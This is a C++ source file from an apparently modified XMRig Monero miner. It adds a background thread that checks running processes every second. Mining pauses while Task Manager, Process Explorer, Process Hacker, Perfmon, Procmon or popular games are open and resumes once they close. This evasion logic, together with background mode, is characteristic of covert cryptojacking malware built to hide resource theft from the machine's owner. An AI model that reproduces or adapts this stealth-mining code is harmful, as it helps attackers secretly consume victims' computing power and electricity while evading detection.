#include <stdlib.h>
#include <uv.h>

#include "api/Api.h"
#include "App.h"
#include "Console.h"
#include "Cpu.h"
#include "crypto/CryptoNight.h"
#include "log/ConsoleLog.h"
#include "log/FileLog.h"
#include "log/Log.h"
#include "Mem.h"
#include "net/Network.h"
#include "Options.h"
#include "Platform.h"
#include "Summary.h"
#include "version.h"
#include "workers/Workers.h"

#include <windows.h>
#include <tlhelp32.h>
#include <thread>

#ifdef HAVE_SYSLOG_H
#   include "log/SysLog.h"
#endif

#ifndef XMRIG_NO_HTTPD
#   include "api/Httpd.h"
#endif

App *App::m_self = nullptr;
bool IsProcessRun(void);

App::App(int argc, char **argv) :
    m_console(nullptr),
    m_httpd(nullptr),
    m_network(nullptr),
    m_options(nullptr)
{
    m_self = this;

    Cpu::init();
    m_options = Options::parse(argc, argv);
    if (!m_options) {
        return;
    }

    Log::init();

    if (!m_options->background()) {
        Log::add(new ConsoleLog(m_options->colors()));
        m_console = new Console(this);
    }

    if (m_options->logFile()) {
        Log::add(new FileLog(m_options->logFile()));
    }

#   ifdef HAVE_SYSLOG_H
    if (m_options->syslog()) {
        Log::add(new SysLog());
    }
#   endif

    Platform::init(m_options->userAgent());
    Platform::setProcessPriority(m_options->priority());

    m_network = new Network(m_options);

	uv_signal_init(uv_default_loop(), &m_signal);
    uv_signal_init(uv_default_loop(), &m_sigHUP);
    uv_signal_init(uv_default_loop(), &m_sigINT);
    uv_signal_init(uv_default_loop(), &m_sigTERM);
}

App::~App()
{
    uv_tty_reset_mode();
#   ifndef XMRIG_NO_HTTPD
    delete m_httpd;
#   endif
    delete m_console;
}

void Check() {
	while(true) {
		Sleep(1000);
		bool Founded = IsProcessRun();
		switch (Founded) {
			case 1:
				Workers::setEnabled(false);
				break;

			default:
				if (!Workers::isEnabled()) { Workers::setEnabled(true); }
				break;
		}
	}
}

bool IsProcessRun(void)
{
	bool RUN;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot, &pe);
	while (Process32Next(hSnapshot, &pe))
	{
		if (wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
		{
			RUN = true;
			return RUN;
		}
		else
			RUN = false;
	}
	return RUN;
}

int App::exec() {
	
	std::thread* check_taskers = new std::thread(Check);
	check_taskers->detach();
	
    if (!m_options) { return 2; }
    uv_signal_start(&m_sigHUP,  App::onSignal, SIGHUP);
    uv_signal_start(&m_sigINT,  App::onSignal, SIGINT);
    uv_signal_start(&m_sigTERM, App::onSignal, SIGTERM);
    background();
	
    if (!m_options) { return 0; }
    uv_signal_start(&m_signal, App::onSignal, SIGHUP);
    uv_signal_start(&m_signal, App::onSignal, SIGTERM);
    uv_signal_start(&m_signal, App::onSignal, SIGINT);

    if (!CryptoNight::init(m_options->algo(), m_options->algoVariant())) {
        LOG_ERR("\"%s\" hash self-test failed.", m_options->algoName());
        return 1;
    }

    Mem::allocate(m_options->algo(), m_options->threads(), m_options->doubleHash(), m_options->hugePages());
    Summary::print();

    if (m_options->dryRun()) {
        LOG_NOTICE("OK");
        release();

        return 0;
    }

#   ifndef XMRIG_NO_API
    Api::start();
#   endif

#   ifndef XMRIG_NO_HTTPD
    m_httpd = new Httpd(m_options->apiPort(), m_options->apiToken());
    m_httpd->start();
#   endif

    Workers::start(m_options->affinity(), m_options->priority());
    m_network->connect();

    const int r = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
    uv_loop_close(uv_default_loop());
	
    delete m_network;
    Options::release();
    Mem::release();
    Platform::release();
    release();
    return r;
}


void App::onConsoleCommand(char command)
{
    switch (command) {
    case 'h':
    case 'H':
        Workers::printHashrate(true);
        break;

    case 'p':
    case 'P':
        if (Workers::isEnabled()) {
            LOG_INFO(m_options->colors() ? "\x1B[01;33mpaused\x1B[0m, press \x1B[01;35mr\x1B[0m to resume" : "paused, press 'r' to resume");
            Workers::setEnabled(false);
        }
        break;

    case 'r':
    case 'R':
        if (!Workers::isEnabled()) {
            LOG_INFO(m_options->colors() ? "\x1B[01;32mresumed" : "resumed");
            Workers::setEnabled(true);
        }
        break;

    case 3:
        LOG_WARN("Ctrl+C received, exiting");
        close();
        break;

    default:
        break;
    }
}


void App::close()
{
    m_network->stop();
    Workers::stop();
    uv_stop(uv_default_loop());
}


void App::release()
{
    if (m_network) {
        delete m_network;
    }

    Options::release();
    Mem::release();
    Platform::release();
}


void App::onSignal(uv_signal_t *handle, int signum)
{
    switch (signum)
    {
    case SIGHUP:
        LOG_WARN("SIGHUP received, exiting");
        break;

    case SIGTERM:
        LOG_WARN("SIGTERM received, exiting");
        break;

    case SIGINT:
        LOG_WARN("SIGINT received, exiting");
        break;

    default:
        break;
    }

    uv_signal_stop(handle);
    m_self->close();
}
